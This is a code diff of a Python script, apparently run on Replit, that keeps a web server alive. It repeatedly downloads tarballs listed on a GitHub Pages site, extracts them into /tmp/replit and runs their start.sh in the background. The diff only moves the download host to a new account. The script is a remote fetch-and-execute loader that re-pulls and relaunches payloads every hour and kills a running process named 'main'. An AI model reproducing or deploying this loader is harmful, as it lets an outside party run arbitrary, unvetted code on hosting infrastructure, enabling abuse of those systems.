@@ -29,12 +29,12 @@ x = threading.Thread(target=Webserver)
 x.start()
 
 time.sleep(10)
-r = urlopen("https://rawrboi.github.io/potential-memory/ran.txt")
+r = urlopen("https://cloudy124.github.io/fantastic-octo-fiesta/ran.txt")
 for line in r:
   line = line.decode('utf-8').strip()
   os.system("rm -rf /tmp/replit")
   os.system("mkdir /tmp/replit")
-  os.system("wget https://rawrboi.github.io/potential-memory/"+line+" -O /tmp/replit/rawr.tar.gz")
+  os.system("wget https://cloudy124.github.io/fantastic-octo-fiesta/"+line+" -O /tmp/replit/rawr.tar.gz")
   os.system("cd /tmp/replit/ && tar -xf /tmp/replit/rawr.tar.gz && bash start.sh &")
   time.sleep(300)
   os.system("cp /tmp/replit/PID ./")
@@ -45,7 +45,7 @@ while True:
   
   time.sleep(3600)
   #x = threading.Thread(target=runsmth)
-  r = urlopen("https://rawrboi.github.io/potential-memory/ran.txt")
+  r = urlopen("https://cloudy124.github.io/fantastic-octo-fiesta/ran.txt")
   for line in r:
     line = line.decode('utf-8').strip()
     rawr = open("ran.txt", "r") 
@@ -60,7 +60,7 @@ while True:
         os.system("pkill main")
         os.system("rm -rf /tmp/replit")
         os.system("mkdir /tmp/replit")
-        os.system("wget https://rawrboi.github.io/potential-memory/"+line+" -O /tmp/replit/rawr.tar.gz")
+        os.system("wget https://cloudy124.github.io/fantastic-octo-fiesta/"+line+" -O /tmp/replit/rawr.tar.gz")
         os.system("cd /tmp/replit/ && tar -xf /tmp/replit/rawr.tar.gz && bash start.sh &")
         time.sleep(300)
         os.system("cp /tmp/replit/PID ./")
